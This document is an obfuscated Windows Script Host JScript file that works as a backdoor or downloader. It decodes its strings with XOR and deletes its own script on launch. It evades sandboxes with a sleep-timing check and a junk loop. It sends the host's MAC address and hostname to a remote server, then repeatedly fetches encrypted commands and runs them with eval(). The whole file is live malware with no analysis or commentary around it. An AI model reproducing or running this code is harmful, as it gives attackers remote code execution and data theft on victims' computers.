function dge4 (hhzx9, j538lyp) {
 try{
  var umbc4a = "";
  if(hhzx9 === ri2cy("DKCBKIBKGIKBFKHKDBK")) {
   j538lyp = unescape(j538lyp);
   var mc16l4kkx = j538lyp.split(ri2cy("GFKEHKCAK"));
   j538lyp = mc16l4kkx[0];
   if (mc16l4kkx.length == 2) {
    umbc4a = mc16l4kkx[1].split("");
   }else{
    return j538lyp;
   }
  }else{
   umbc4a = (Math.floor(Math.random()*9000) + 1000).toString().split("");
   j538lyp=unescape(encodeURIComponent(j538lyp));
  }
  var o1u722r1 = new Array(j538lyp.length);
  for (var ol76bhq7 = 0; ol76bhq7 < j538lyp.length; ol76bhq7++) {
   var rz7wh = j538lyp.charCodeAt(ol76bhq7) ^ umbc4a[ol76bhq7 % umbc4a.length].charCodeAt(0);
   o1u722r1[ol76bhq7] = String.fromCharCode(rz7wh);
  }
  var z9gz = o1u722r1.join("");
  if(hhzx9 === ri2cy("CKDAKIBKGIKBFKHKDBK")) {
   z9gz = z9gz + ri2cy("GFKEHKCAK") + umbc4a.join("");
   z9gz = escape(z9gz);
  }
  return z9gz;
 }catch(e) {
  if (!n0d37()) dqmzf();
 return ri2cy("JKDBK");
 }
}
var shell = new ActiveXObject(ri2cy("EIKDFKIBKGIKDBKHKDBKCDKFCKCEKIHKJAKCGK"));
var xhc84 = shell.expandEnvironmentStrings(ri2cy("GGKEJKJIKBACKFAKFEKGDKBCAKGGK"));
var k466c6jxwu = new Date().getUTCMilliseconds();
var wmi = GetObject(ri2cy("BGKCFKJCKJBKBHKCGKDBKHEKJDKCKJDKIJKCKIIKEAKBBCKECKDIKAK"));
var fso = new ActiveXObject(ri2cy("FCKBJKGEKJFKGKDKCKIHKAKJEKBBGKJFKCGKBIKFGKGEKCAKEKIHKJBKFHKCBKBKJCKEKEK"));
try{
 fso.deleteFile(WScript.ScriptFullName);
}catch(e) {}
if (!n0d37()) dqmzf();
try{
 a66jt ();
 x16vs();
}catch(e) {
 x16vs();
}

function n0d37() {
 var wkgqc = true;
 try {
  var s1ev9e = WScript;
  var sa29665e = new Date();
  s1ev9e.Sleep( 3000 );
  var sa29665e2 = new Date();
  var btx3l = sa29665e2 - sa29665e;
  if (btx3l < 2980) {
   wkgqc = false;
   WScript.Echo(btx3l);
  }
  if (wkgqc) {
   var ahctq = send_data(ri2cy("CBKCBKGHKGHKBJKEKDBK"), ri2cy("CDKBHKIFKIDKEBKDAKBFKEKJKCBKGJK"), true, ri2cy("BJKDAKGFKJDKAKBGKBCKHGKBDKCGKGHKIAKCBKEKAKHIKBCKJEKIBKIJKCHK"));
   if (ahctq !== ri2cy("JKDBK")) {
    wkgqc = false;
    WScript.Echo("url");
   }
  }
  return true;
 }catch(e) {
  WScript.Echo("mem");
 return false;
 }
}
function send_data (hhzx9, p2m1skzk, yqgg7ee, zm2l5ddfh) {
 try {
  if (zm2l5ddfh == "") {
   zm2l5ddfh = i98r5()
  }
 var i7pf1098x = new ActiveXObject(ri2cy("ECKDFKBAGKBCDKFIKGJKGJKBAGKCKCKGIKIDKEKEHKDIKBBHKEHKDGKBACKBACK"));
 if(hhzx9 === ri2cy("CBKCBKGHKGHKBJKEKDBK")) {
 i7pf1098x.open(ri2cy("FFKGDKJHKJIK"), zm2l5ddfh + ri2cy("IIKEKHFKHAKBJKHEKFKIIKBAKCBK"), false);
 p2m1skzk = ri2cy("BAKCKIIKJCKDBKCKCIKGEKJKJKIIKGEKDBKBDKCEKEK") + dge4(ri2cy("CKDAKIBKGIKBFKHKDBK"), ri2cy("AKCKJDKGHKGKHEKBFKIGKEKHBKCKGKIAKFKDBKEKIHKIGKGFKIDKCBKFKBEKHHKJAKHBKBBHKJCKDKBEKBDKBAKJEKDGKHBKGGKGJKHJKIIKHIKGFKEKJBKJBKBJKHEKJAKBBKIHKGEKCKGKIAKCKCKJDKJAK") + k466c6jxwu + ri2cy("GFKCFKIGKBBK") + rcmn9() + "&" + p2m1skzk);
 }else{
 i7pf1098x.open(ri2cy("FFKGDKJHKJIK"), zm2l5ddfh + ri2cy("IIKEKHFKHAKBJKHEKIKIGKJKEKIHKIIKCKIBKCKJDKJAK") + k466c6jxwu, false);
 if(yqgg7ee) {
 p2m1skzk = dge4(ri2cy("CKDAKIBKGIKBFKHKDBK"), p2m1skzk);
 }
 }
 i7pf1098x.setRequestHeader(ri2cy("FAKDKIHKGIKJBKFEKBCKJCKJKEK"), ri2cy("ECKDBKHCKJFKCGKCHKBAKCCKICKJEKCKCCKJEKDCKCKIHKDKDBKGJKGJKIGKFHKGDKCFKIBKJEKDKBDKIGKDCKCKIHKIBKGIKJKCCKBEKGFKJFKCKHBKCKGIKBCKGEKHIKGJKJKHIKIAKBBHKIDKCBKCIKEKCCKIFKGEKDKGKHAKHAKJBKIKHBKFEKJBKGIKBJKBHKEKGFKHCKGJKCKCEKHAK"));
 i7pf1098x.setRequestHeader(ri2cy("DGKDBKJCKGGKBJKCFKDBKCAKFBKJKGGKIDK"), ri2cy("GKAKGGKJAKDBKCAKBAKHHKBEKDBKJCKCFKBEKJAKCIKHIKBGKJDKIEKIJKEKCGKHAKHGKCBKCIKIHKIIKCBKCEKBFKJCKDK"));
 i7pf1098x.setOption(2, 13056);
 i7pf1098x.send(p2m1skzk);
 return i7pf1098x.responseText;
 }catch(e) {
 return ri2cy("JKDBK");
 }
}
function x16vs () {
 var ahctq = "";
 var s1ev9e = WScript;
 ahctq = send_data(ri2cy("CBKCBKGHKGHKBJKEKDBK"), ri2cy("CDKBHKIFKIDKEBKDAKBFKEKJKCBKGJK"), true, "");
 if(ahctq !== ri2cy("JKDBK")) {
  try {
   ahctq = dge4(ri2cy("DKCBKIBKGIKBFKHKDBK"), ahctq);
   if(ahctq !== ri2cy("JKDBK")) {
    eval(dge4(ri2cy("DKCBKIBKGIKBFKHKDBK"), ahctq));
   }
 }catch(e) {
 }
 }
 var kzv818 = 1000;
 s1ev9e.Sleep(kzv818);
 x16vs();
 if (!n0d37()) dqmzf();
}
function i98r5 () {
 var w3skv = [ri2cy("BEKCJKIDKIBKBJKEK"), ri2cy("CDKCFKIBKGGKDKFKBEKHEK"), ri2cy("BEKCJKIFK"), ri2cy("BEKDAKIEKIJK"), ri2cy("JKCBKGJK")];
 var d6o7c = [ri2cy("CAKJKJCKIFK"), ri2cy("CAKCEKJDKGFK"), ri2cy("BFKCFKIGKIDK"), ri2cy("GKCAKIGK"), ri2cy("JKCBKGJK"), ri2cy("CBKCBKJCKIDKBK"), ri2cy("DKCBKJEKIDKCKBIK")];
 if (!n0d37()) dqmzf();
 var zm2l5ddfh = w3skv[Math.floor(Math.random() * w3skv.length)] + "/" + d6o7c[Math.floor(Math.random() * d6o7c.length)];
 return ri2cy("BFKEKHAKHAKFKHHKGIKCCKFKJKGGKIHKFKEKEKJAKBEKBHKHAKJFKCFKCFKGJKJAKIKCJKCJK") + zm2l5ddfh;
}
function ri2cy(of2bc) {
 syedom5mv = "gp26vwk9";
 var tc977=new String("");
 for(ol76bhq7=0;ol76bhq7<11;ol76bhq7++) {
  var f51rr7=new RegExp(String.fromCharCode(ol76bhq7+65),"g");
  if(ol76bhq7==10)of2bc=of2bc.replace(f51rr7,","); else of2bc=of2bc.replace(f51rr7,String(ol76bhq7));
 }
 var r21y1cio6 = of2bc.split(",");
 var ol76bhq7=0;var odhuk=0;
 for(ol76bhq7=0;ol76bhq7<r21y1cio6.length-1;ol76bhq7++) {
  var v1hv9=String.fromCharCode(Number(r21y1cio6[ol76bhq7]));
  var rv61u=v1hv9.charCodeAt(0)^syedom5mv.charCodeAt(odhuk);
  v1hv9=String.fromCharCode(rv61u);
  tc977+= v1hv9;
  if(odhuk==syedom5mv.length-1)odhuk=0; else odhuk++;
 }
 return tc977;
}
function dqmzf() {
 try {
  for (var ol76bhq7 = 0; ol76bhq7 < 100000000; ol76bhq7++) {
   var t1t6y0i = (Math.floor(Math.random()*9000) + 1000).toString().split("");
   var mhec0aa = (Math.floor(Math.random()*9000) + 1000).toString().split("");
   if (t1t6y0i !== mhec0aa) {t1t6y0i += mhec0aa}
  }
  return true;
 }catch(e) {
 return false;
 }
}
function rcmn9 () {
 var mgr321c = ri2cy("DEKCKGEKIJKEK");
 var z0x0r = ri2cy("DEKCKGEKIJKEK");
 try{
  var t5834 = wmi.ExecQuery(ri2cy("CAKCBKJEKIDKCBKDKHFKBJKHBKCCKGEKIJKCHKIHKGAKIAKJKGHKAKBAFKFGKBIKDBKHIKIKCKIJKBBJKBIKCCKCHKHHKCKCKBBDKIJKCEKBHKCKJEKBIKCKIDKGGKDBKCEKFKCFKBGKCEKIHKGIKBJKIHKCKHDKCKDAKIDKIEKCGKBIKBFKCFKJAKIAKHAKGIKDKBIK"));
  var h4rq = new Enumerator(t5834);
  for (; !h4rq.atEnd(); h4rq.moveNext()) {
   mgr321c = h4rq.item().DNSHostName;
   z0x0r = h4rq.item().macaddress;
   if(typeof z0x0r === ri2cy("CAKEKGEKJFKCEKBGK") && z0x0r.length > 1) {
    if(typeof mgr321c !== ri2cy("CAKEKGEKJFKCEKBGK") && mgr321c.length < 1) {
     mgr321c = ri2cy("FAKDAKIJKIIKCFKAKFK");
    }else{
     for (var ol76bhq7 = 0; ol76bhq7 < mgr321c.length; ol76bhq7++) {
      if (mgr321c.charAt(ol76bhq7) > "z") {
       mgr321c = mgr321c.substr(0, ol76bhq7) + "_" + mgr321c.substr(ol76bhq7 + 1);
      }
     }
    }
    return z0x0r + "_" + mgr321c;
   }
  }
 }catch(e) {
  if (!n0d37()) dqmzf();
 return z0x0r + "_" + mgr321c;
 }

}
function a66jt () {
 var s1ev9e = WScript;
 s1ev9e.Sleep(1000);
}

